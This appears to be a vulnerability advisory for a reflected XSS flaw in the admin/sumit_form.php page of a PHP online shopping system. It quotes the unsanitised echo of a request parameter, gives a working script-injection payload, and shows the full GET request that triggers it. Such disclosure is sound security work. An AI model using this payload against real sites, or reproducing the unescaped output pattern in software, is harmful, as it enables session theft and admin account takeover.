## ONLINE SHOPPING SYSTEM admin/sumit_form.php Reflected XSS Vulnerability

### I. Vulnerability Impact

An attacker can craft a malicious URL that injects arbitrary JavaScript into the admin panel page, which executes in the victim's browser. This enables session cookie theft, CSRF attack chaining, and full admin account takeover.

### II. Source Code Analysis

The vulnerability resides in `admin/sumit_form.php`, lines 2 and 13:

```php
$link = $_REQUEST['success'];
...
<input hidden="" type="text" name="success" value="<?php echo "$link";?>">
```

The `$link` variable is taken directly from `$_REQUEST['success']` (accessible via GET) and output into the `value` attribute of an `<input>` tag without any sanitization. An attacker can close the attribute with a double quote and inject arbitrary HTML tags including `<script>`.

### III. Payload

The core injection payload is:

```
"><ScRiPt>alert(888)</sCrIpT>
```

After injection, the output HTML becomes:

```html
<input hidden="" type="text" name="success" value=""><ScRiPt>alert(888)</sCrIpT>">
```

The browser parses `<ScRiPt>alert(888)</sCrIpT>` as a script element and executes the JavaScript.

HTTP request:

```
GET /admin/sumit_form.php?success="><ScRiPt>alert(888)</sCrIpT> HTTP/1.1
Host: onlineshop
```

### IV. Source Download

https://code-projects.org/online-shopping-system-in-php-with-source-code/



![image-20260627112419155](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260627112419155.png)